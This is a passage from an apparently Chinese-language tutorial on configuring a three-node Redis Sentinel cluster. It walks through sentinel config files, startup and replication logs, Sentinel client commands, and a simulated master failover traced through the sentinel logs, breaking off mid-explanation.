<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7127:M 22 Aug 14:16:48.416 * Slave 127.0.0.1:26379 asks for synchronization</span><br><span class="line">7127:M 22 Aug 14:16:51.848 * Slave 127.0.0.1:36379 asks for synchronization</span><br></pre></td></tr></table></figure>

<ul>
<li><p>节点 redis-26379</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /var/<span class="built_in">log</span>/redis/redis-26379.log </span></span><br><span class="line">7132:C 22 Aug 14:16:48.407 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br><span class="line">7132:C 22 Aug 14:16:48.408 # Redis version=4.0.11, bits=64, commit=00000000, modified=0, pid=7132, just started</span><br><span class="line">7132:C 22 Aug 14:16:48.408 # Configuration loaded</span><br><span class="line">7133:S 22 Aug 14:16:48.410 * Increased maximum number of open files to 10032 (it was originally set to 256).</span><br><span class="line">7133:S 22 Aug 14:16:48.412 * Running mode=standalone, port=26379.</span><br><span class="line">7133:S 22 Aug 14:16:48.413 # Server initialized</span><br><span class="line">7133:S 22 Aug 14:16:48.413 * Ready to accept connections</span><br><span class="line">7133:S 22 Aug 14:16:48.413 * Connecting to MASTER 127.0.0.1:16379</span><br><span class="line">7133:S 22 Aug 14:16:48.413 * MASTER &lt;-&gt; SLAVE sync started</span><br><span class="line">7133:S 22 Aug 14:16:48.414 * Non blocking connect for SYNC fired the event.</span><br><span class="line">7133:S 22 Aug 14:16:48.414 * Master replied to PING, replication can continue...</span><br><span class="line">7133:S 22 Aug 14:16:48.415 * Partial resynchronization not possible (no cached master)</span><br><span class="line">7133:S 22 Aug 14:16:48.417 * Full resync from master: 211d3b4eceaa3af4fe5c77d22adf06e1218e0e7b:0</span><br><span class="line">7133:S 22 Aug 14:16:48.494 * MASTER &lt;-&gt; SLAVE sync: receiving 176 bytes from master</span><br><span class="line">7133:S 22 Aug 14:16:48.495 * MASTER &lt;-&gt; SLAVE sync: Flushing old data</span><br><span class="line">7133:S 22 Aug 14:16:48.496 * MASTER &lt;-&gt; SLAVE sync: Loading DB in memory</span><br><span class="line">7133:S 22 Aug 14:16:48.498 * MASTER &lt;-&gt; SLAVE sync: Finished with success</span><br></pre></td></tr></table></figure>
</li>
<li><p>节点 redis-36379</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /var/<span class="built_in">log</span>/redis/redis-36379.log </span></span><br><span class="line">7136:C 22 Aug 14:16:51.839 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br><span class="line">7136:C 22 Aug 14:16:51.840 # Redis version=4.0.11, bits=64, commit=00000000, modified=0, pid=7136, just started</span><br><span class="line">7136:C 22 Aug 14:16:51.841 # Configuration loaded</span><br><span class="line">7137:S 22 Aug 14:16:51.843 * Increased maximum number of open files to 10032 (it was originally set to 256).</span><br><span class="line">7137:S 22 Aug 14:16:51.845 * Running mode=standalone, port=36379.</span><br><span class="line">7137:S 22 Aug 14:16:51.845 # Server initialized</span><br><span class="line">7137:S 22 Aug 14:16:51.846 * Ready to accept connections</span><br><span class="line">7137:S 22 Aug 14:16:51.846 * Connecting to MASTER 127.0.0.1:16379</span><br><span class="line">7137:S 22 Aug 14:16:51.847 * MASTER &lt;-&gt; SLAVE sync started</span><br><span class="line">7137:S 22 Aug 14:16:51.847 * Non blocking connect for SYNC fired the event.</span><br><span class="line">7137:S 22 Aug 14:16:51.847 * Master replied to PING, replication can continue...</span><br><span class="line">7137:S 22 Aug 14:16:51.848 * Partial resynchronization not possible (no cached master)</span><br><span class="line">7137:S 22 Aug 14:16:51.850 * Full resync from master: 211d3b4eceaa3af4fe5c77d22adf06e1218e0e7b:14</span><br><span class="line">7137:S 22 Aug 14:16:51.923 * MASTER &lt;-&gt; SLAVE sync: receiving 176 bytes from master</span><br><span class="line">7137:S 22 Aug 14:16:51.923 * MASTER &lt;-&gt; SLAVE sync: Flushing old data</span><br><span class="line">7137:S 22 Aug 14:16:51.924 * MASTER &lt;-&gt; SLAVE sync: Loading DB in memory</span><br><span class="line">7137:S 22 Aug 14:16:51.927 * MASTER &lt;-&gt; SLAVE sync: Finished with success</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="Sentinel-的配置管理"><a href="#Sentinel-的配置管理" class="headerlink" title="Sentinel 的配置管理"></a>Sentinel 的配置管理</h5><p>分别拷贝三份 redis-sentinel.conf 文件到 /usr/local/redis-sentinel 目录下面。三个配置文件分别对应 master、slave1 和 slave2 三个 Redis 节点的 哨兵配置。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo cp /usr/<span class="built_in">local</span>/redis-4.0.11/sentinel.conf /usr/<span class="built_in">local</span>/redis-sentinel/sentinel-16380.conf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cp /usr/<span class="built_in">local</span>/redis-4.0.11/sentinel.conf /usr/<span class="built_in">local</span>/redis-sentinel/sentinel-26380.conf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cp /usr/<span class="built_in">local</span>/redis-4.0.11/sentinel.conf /usr/<span class="built_in">local</span>/redis-sentinel/sentinel-36380.conf</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>节点1：sentinel-16380.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">protected-mode no</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">port 16380</span><br><span class="line">daemonize yes</span><br><span class="line">sentinel monitor master 127.0.0.1 16379 2</span><br><span class="line">sentinel down-after-milliseconds master 5000</span><br><span class="line">sentinel failover-timeout master 180000</span><br><span class="line">sentinel parallel-syncs master 1</span><br><span class="line">sentinel auth-pass master 123456</span><br><span class="line">logfile /var/log/redis/sentinel-16380.log</span><br></pre></td></tr></table></figure>
</li>
<li><p>节点2：sentinel-26380.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">protected-mode no</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">port 26380</span><br><span class="line">daemonize yes</span><br><span class="line">sentinel monitor master 127.0.0.1 16379 2</span><br><span class="line">sentinel down-after-milliseconds master 5000</span><br><span class="line">sentinel failover-timeout master 180000</span><br><span class="line">sentinel parallel-syncs master 1</span><br><span class="line">sentinel auth-pass master 123456</span><br><span class="line">logfile /var/log/redis/sentinel-26380.log</span><br></pre></td></tr></table></figure>
</li>
<li><p>节点3：sentinel-36380.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">protected-mode no</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">port 36380</span><br><span class="line">daemonize yes</span><br><span class="line">sentinel monitor master 127.0.0.1 16379 2</span><br><span class="line">sentinel down-after-milliseconds master 5000</span><br><span class="line">sentinel failover-timeout master 180000</span><br><span class="line">sentinel parallel-syncs master 1</span><br><span class="line">sentinel auth-pass master 123456</span><br><span class="line">logfile /var/log/redis/sentinel-36380.log</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="Sentinel-启动验证"><a href="#Sentinel-启动验证" class="headerlink" title="Sentinel 启动验证"></a>Sentinel 启动验证</h5><p>按顺序分别启动 16380，26380 和 36380 三个 Sentinel 节点，启动命令和启动日志如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo redis-sentinel /usr/<span class="built_in">local</span>/redis-sentinel/sentinel-16380.conf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo redis-sentinel /usr/<span class="built_in">local</span>/redis-sentinel/sentinel-26380.conf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo redis-sentinel /usr/<span class="built_in">local</span>/redis-sentinel/sentinel-36380.conf</span></span><br></pre></td></tr></table></figure>

<p>查看 Sentinel 的启动进程：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -ef | grep redis-sentinel</span></span><br><span class="line">    0  7954     1   0  3:30下午 ??         0:00.05 redis-sentinel 0.0.0.0:16380 [sentinel] </span><br><span class="line">    0  7957     1   0  3:30下午 ??         0:00.05 redis-sentinel 0.0.0.0:26380 [sentinel] </span><br><span class="line">    0  7960     1   0  3:30下午 ??         0:00.04 redis-sentinel 0.0.0.0:36380 [sentinel]</span><br></pre></td></tr></table></figure>

<p>查看 Sentinel 的启动日志：</p>
<ul>
<li>节点 sentinel-16380<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /var/<span class="built_in">log</span>/redis/sentinel-16380.log </span></span><br><span class="line">7953:X 22 Aug 15:30:27.245 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br><span class="line">7953:X 22 Aug 15:30:27.245 # Redis version=4.0.11, bits=64, commit=00000000, modified=0, pid=7953, just started</span><br><span class="line">7953:X 22 Aug 15:30:27.245 # Configuration loaded</span><br><span class="line">7954:X 22 Aug 15:30:27.247 * Increased maximum number of open files to 10032 (it was originally set to 256).</span><br><span class="line">7954:X 22 Aug 15:30:27.249 * Running mode=sentinel, port=16380.</span><br><span class="line">7954:X 22 Aug 15:30:27.250 # Sentinel ID is 69d05b86a82102a8919231fd3c2d1f21ce86e000</span><br><span class="line">7954:X 22 Aug 15:30:27.250 # +monitor master master 127.0.0.1 16379 quorum 2</span><br><span class="line">7954:X 22 Aug 15:30:32.286 # +sdown sentinel fd166dc66425dc1d9e2670e1f17cb94fe05f5fc7 127.0.0.1 36380 @ master 127.0.0.1 16379</span><br><span class="line">7954:X 22 Aug 15:30:34.588 # -sdown sentinel fd166dc66425dc1d9e2670e1f17cb94fe05f5fc7 127.0.0.1 36380 @ master 127.0.0.1 16379</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>sentinel-16380 节点的 Sentinel ID 为 69d05b86a82102a8919231fd3c2d1f21ce86e000，并通过 Sentinel ID 把自身加入 sentinel 集群中。</p>
<ul>
<li>节点 sentinel-26380<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /var/<span class="built_in">log</span>/redis/sentinel-26380.log </span></span><br><span class="line">7956:X 22 Aug 15:30:30.900 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br><span class="line">7956:X 22 Aug 15:30:30.901 # Redis version=4.0.11, bits=64, commit=00000000, modified=0, pid=7956, just started</span><br><span class="line">7956:X 22 Aug 15:30:30.901 # Configuration loaded</span><br><span class="line">7957:X 22 Aug 15:30:30.904 * Increased maximum number of open files to 10032 (it was originally set to 256).</span><br><span class="line">7957:X 22 Aug 15:30:30.905 * Running mode=sentinel, port=26380.</span><br><span class="line">7957:X 22 Aug 15:30:30.906 # Sentinel ID is 21e30244cda6a3d3f55200bcd904d0877574e506</span><br><span class="line">7957:X 22 Aug 15:30:30.906 # +monitor master master 127.0.0.1 16379 quorum 2</span><br><span class="line">7957:X 22 Aug 15:30:30.907 * +slave slave 127.0.0.1:26379 127.0.0.1 26379 @ master 127.0.0.1 16379</span><br><span class="line">7957:X 22 Aug 15:30:30.911 * +slave slave 127.0.0.1:36379 127.0.0.1 36379 @ master 127.0.0.1 16379</span><br><span class="line">7957:X 22 Aug 15:30:36.311 * +sentinel sentinel fd166dc66425dc1d9e2670e1f17cb94fe05f5fc7 127.0.0.1 36380 @ master 127.0.0.1 16379</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>sentinel-26380 节点的 Sentinel ID 为 21e30244cda6a3d3f55200bcd904d0877574e506，并通过 Sentinel ID 把自身加入 sentinel 集群中。此时 sentinel 集群中已有 sentinel-16380 和 sentinel-26380 两个节点。</p>
<ul>
<li>节点 sentinel-36380<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /var/<span class="built_in">log</span>/redis/sentinel-36380.log </span></span><br><span class="line">7959:X 22 Aug 15:30:34.273 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br><span class="line">7959:X 22 Aug 15:30:34.274 # Redis version=4.0.11, bits=64, commit=00000000, modified=0, pid=7959, just started</span><br><span class="line">7959:X 22 Aug 15:30:34.274 # Configuration loaded</span><br><span class="line">7960:X 22 Aug 15:30:34.276 * Increased maximum number of open files to 10032 (it was originally set to 256).</span><br><span class="line">7960:X 22 Aug 15:30:34.277 * Running mode=sentinel, port=36380.</span><br><span class="line">7960:X 22 Aug 15:30:34.278 # Sentinel ID is fd166dc66425dc1d9e2670e1f17cb94fe05f5fc7</span><br><span class="line">7960:X 22 Aug 15:30:34.278 # +monitor master master 127.0.0.1 16379 quorum 2</span><br><span class="line">7960:X 22 Aug 15:30:34.279 * +slave slave 127.0.0.1:26379 127.0.0.1 26379 @ master 127.0.0.1 16379</span><br><span class="line">7960:X 22 Aug 15:30:34.283 * +slave slave 127.0.0.1:36379 127.0.0.1 36379 @ master 127.0.0.1 16379</span><br><span class="line">7960:X 22 Aug 15:30:34.993 * +sentinel sentinel 21e30244cda6a3d3f55200bcd904d0877574e506 127.0.0.1 26380 @ master 127.0.0.1 16379</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>sentinel-36380 节点的 Sentinel ID 为 fd166dc66425dc1d9e2670e1f17cb94fe05f5fc7，并通过 Sentinel ID 把自身加入 sentinel 集群中。此时 sentinel 集群中已有 sentinel-16380，sentinel-26380 和 sentinel-36380 三个节点。</p>
<h5 id="Sentinel-配置刷新"><a href="#Sentinel-配置刷新" class="headerlink" title="Sentinel 配置刷新"></a>Sentinel 配置刷新</h5><ul>
<li>节点1：sentinel-16380.conf</li>
</ul>
<p>sentinel-16380.conf 文件新生成如下的配置项：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Generated by CONFIG REWRITE</span></span><br><span class="line">dir <span class="string">"/usr/local/redis-sentinel"</span></span><br><span class="line">sentinel config-epoch master 0</span><br><span class="line">sentinel leader-epoch master 0</span><br><span class="line">sentinel known-slave master 127.0.0.1 36379</span><br><span class="line">sentinel known-slave master 127.0.0.1 26379</span><br><span class="line">sentinel known-sentinel master 127.0.0.1 26380 21e30244cda6a3d3f55200bcd904d0877574e506</span><br><span class="line">sentinel known-sentinel master 127.0.0.1 36380 fd166dc66425dc1d9e2670e1f17cb94fe05f5fc7</span><br><span class="line">sentinel current-epoch 0</span><br></pre></td></tr></table></figure>

<p>可以注意到，sentinel-16380.conf 刷新写入了 Redis 主节点关联的所有 从节点 redis-26379 和 redis-36379，同时写入了其余两个 Sentinel 节点 sentinel-26380 和 sentinel-36380 的 IP 地址，端口号 和 Sentinel ID。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Generated by CONFIG REWRITE</span></span><br><span class="line">dir <span class="string">"/usr/local/redis-sentinel"</span></span><br><span class="line">sentinel config-epoch master 0</span><br><span class="line">sentinel leader-epoch master 0</span><br><span class="line">sentinel known-slave master 127.0.0.1 26379</span><br><span class="line">sentinel known-slave master 127.0.0.1 36379</span><br><span class="line">sentinel known-sentinel master 127.0.0.1 36380 fd166dc66425dc1d9e2670e1f17cb94fe05f5fc7</span><br><span class="line">sentinel known-sentinel master 127.0.0.1 16380 69d05b86a82102a8919231fd3c2d1f21ce86e000</span><br><span class="line">sentinel current-epoch 0</span><br></pre></td></tr></table></figure>

<p>可以注意到，sentinel-26380.conf 刷新写入了 Redis 主节点关联的所有 从节点 redis-26379 和 redis-36379，同时写入了其余两个 Sentinel 节点 sentinel-36380 和 sentinel-16380 的 IP 地址，端口号 和 Sentinel ID。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Generated by CONFIG REWRITE</span></span><br><span class="line">dir <span class="string">"/usr/local/redis-sentinel"</span></span><br><span class="line">sentinel config-epoch master 0</span><br><span class="line">sentinel leader-epoch master 0</span><br><span class="line">sentinel known-slave master 127.0.0.1 36379</span><br><span class="line">sentinel known-slave master 127.0.0.1 26379</span><br><span class="line">sentinel known-sentinel master 127.0.0.1 16380 69d05b86a82102a8919231fd3c2d1f21ce86e000</span><br><span class="line">sentinel known-sentinel master 127.0.0.1 26380 21e30244cda6a3d3f55200bcd904d0877574e506</span><br><span class="line">sentinel current-epoch 0</span><br></pre></td></tr></table></figure>

<p>可以注意到，sentinel-36380.conf 刷新写入了 Redis 主节点关联的所有 从节点 redis-26379 和 redis-36379，同时写入了其余两个 Sentinel 节点 sentinel-16380 和 sentinel-26380 的 IP 地址，端口号 和 Sentinel ID。</p>
<h4 id="Sentinel-时客户端命令"><a href="#Sentinel-时客户端命令" class="headerlink" title="Sentinel 时客户端命令"></a>Sentinel 时客户端命令</h4><ul>
<li><p>检查其他 Sentinel 节点的状态，返回 <code>PONG</code> 为正常。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> PING sentinel</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>显示被监控的所有 主节点 以及它们的状态。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> SENTINEL masters</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>显示指定 主节点 的信息和状态。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> SENTINEL master &lt;master_name&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>显示指定 主节点 的所有 从节点 以及它们的状态。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> SENTINEL slaves &lt;master_name&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>返回指定 主节点 的 IP 地址和 端口。如果正在进行 <code>failover</code> 或者 <code>failover</code> 已经完成，将会显示被提升为 主节点 的 从节点 的 IP 地址和 端口。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> SENTINEL get-master-addr-by-name &lt;master_name&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>重置名字匹配该 正则表达式 的所有的 主节点 的状态信息，清除它之前的 状态信息，以及 从节点 的信息。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> SENTINEL reset &lt;pattern&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>强制当前 Sentinel 节点执行 <code>failover</code>，并且不需要得到其他 Sentinel 节点的同意。但是 <code>failover</code> 后会将 最新的配置 发送给其他 Sentinel 节点。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SENTINEL failover &lt;master_name&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Redis-Sentinel-故障切换与恢复"><a href="#Redis-Sentinel-故障切换与恢复" class="headerlink" title="Redis Sentinel 故障切换与恢复"></a>Redis Sentinel 故障切换与恢复</h3><h4 id="Redis-CLI-客户端跟踪"><a href="#Redis-CLI-客户端跟踪" class="headerlink" title="Redis CLI 客户端跟踪"></a>Redis CLI 客户端跟踪</h4><p>上面的日志显示，redis-16379 节点为 主节点，它的进程 ID 为 7127。为了模拟 Redis 主节点故障，强制杀掉这个进程。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">kill</span> -9 7127</span></span><br></pre></td></tr></table></figure>

<p>使用 redis-cli 客户端命令进入 sentinel-16380 节点，查看 Redis 节点 的状态信息。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -p 16380</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查看 Redis 主从集群的 主节点 信息。可以发现 redis-26379 晋升为 新的主节点。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:16380&gt; SENTINEL master master</span><br><span class="line"> 1) "name"</span><br><span class="line"> 2) "master"</span><br><span class="line"> 3) "ip"</span><br><span class="line"> 4) "127.0.0.1"</span><br><span class="line"> 5) "port"</span><br><span class="line"> 6) "26379"</span><br><span class="line"> 7) "runid"</span><br><span class="line"> 8) "b8ca3b468a95d1be5efe1f50c50636cafe48c59f"</span><br><span class="line"> 9) "flags"</span><br><span class="line">10) "master"</span><br><span class="line">11) "link-pending-commands"</span><br><span class="line">12) "0"</span><br><span class="line">13) "link-refcount"</span><br><span class="line">14) "1"</span><br><span class="line">15) "last-ping-sent"</span><br><span class="line">16) "0"</span><br><span class="line">17) "last-ok-ping-reply"</span><br><span class="line">18) "588"</span><br><span class="line">19) "last-ping-reply"</span><br><span class="line">20) "588"</span><br><span class="line">21) "down-after-milliseconds"</span><br><span class="line">22) "5000"</span><br><span class="line">23) "info-refresh"</span><br><span class="line">24) "9913"</span><br><span class="line">25) "role-reported"</span><br><span class="line">26) "master"</span><br><span class="line">27) "role-reported-time"</span><br><span class="line">28) "663171"</span><br><span class="line">29) "config-epoch"</span><br><span class="line">30) "1"</span><br><span class="line">31) "num-slaves"</span><br><span class="line">32) "2"</span><br><span class="line">33) "num-other-sentinels"</span><br><span class="line">34) "2"</span><br><span class="line">35) "quorum"</span><br><span class="line">36) "2"</span><br><span class="line">37) "failover-timeout"</span><br><span class="line">38) "180000"</span><br><span class="line">39) "parallel-syncs"</span><br><span class="line">40) "1"</span><br></pre></td></tr></table></figure>

<h4 id="Redis-Sentinel-日志跟踪"><a href="#Redis-Sentinel-日志跟踪" class="headerlink" title="Redis Sentinel 日志跟踪"></a>Redis Sentinel 日志跟踪</h4><p>查看任意 Sentinel 节点的日志如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">7954:X 22 Aug 18:40:22.504 # +tilt #tilt mode entered</span><br><span class="line">7954:X 22 Aug 18:40:32.197 # +tilt #tilt mode entered</span><br><span class="line">7954:X 22 Aug 18:41:02.241 # -tilt #tilt mode exited</span><br><span class="line">7954:X 22 Aug 18:48:24.550 # +sdown master master 127.0.0.1 16379</span><br><span class="line">7954:X 22 Aug 18:48:24.647 # +new-epoch 1</span><br><span class="line">7954:X 22 Aug 18:48:24.651 # +vote-for-leader fd166dc66425dc1d9e2670e1f17cb94fe05f5fc7 1</span><br><span class="line">7954:X 22 Aug 18:48:25.678 # +odown master master 127.0.0.1 16379 #quorum 3/2</span><br><span class="line">7954:X 22 Aug 18:48:25.678 # Next failover delay: I will not start a failover before Wed Aug 22 18:54:24 2018</span><br><span class="line">7954:X 22 Aug 18:48:25.709 # +config-update-from sentinel fd166dc66425dc1d9e2670e1f17cb94fe05f5fc7 127.0.0.1 36380 @ master 127.0.0.1 16379</span><br><span class="line">7954:X 22 Aug 18:48:25.710 # +switch-master master 127.0.0.1 16379 127.0.0.1 26379</span><br><span class="line">7954:X 22 Aug 18:48:25.710 * +slave slave 127.0.0.1:36379 127.0.0.1 36379 @ master 127.0.0.1 26379</span><br><span class="line">7954:X 22 Aug 18:48:25.711 * +slave slave 127.0.0.1:16379 127.0.0.1 16379 @ master 127.0.0.1 26379</span><br><span class="line">7954:X 22 Aug 18:48:30.738 # +sdown slave 127.0.0.1:16379 127.0.0.1 16379 @ master 127.0.0.1 26379</span><br><span class="line">7954:X 22 Aug 19:38:23.479 # -sdown slave 127.0.0.1:16379 127.0.0.1 16379 @ master 127.0.0.1 26379</span><br></pre></td></tr></table></figure>

<ul>
<li><p>分析日志，可以发现 redis-16329 节点先进入 sdown 主观下线 状态。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+sdown master master 127.0.0.1 16379</span><br></pre></td></tr></table></figure>
</li>
<li><p>哨兵检测到 redis-16329 出现故障，Sentinel 进入一个 新纪元，从 0 变为 1。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+new-epoch 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>三个 Sentinel 节点开始协商 主节点 的状态，判断其是否需要 客观下线。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+vote-for-leader fd166dc66425dc1d9e2670e1f17cb94fe05f5fc7 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>超过 quorum 个数的 Sentinel 节点认为 主节点 出现故障，redis-16329 节点进入 客观下线 状态。</p>
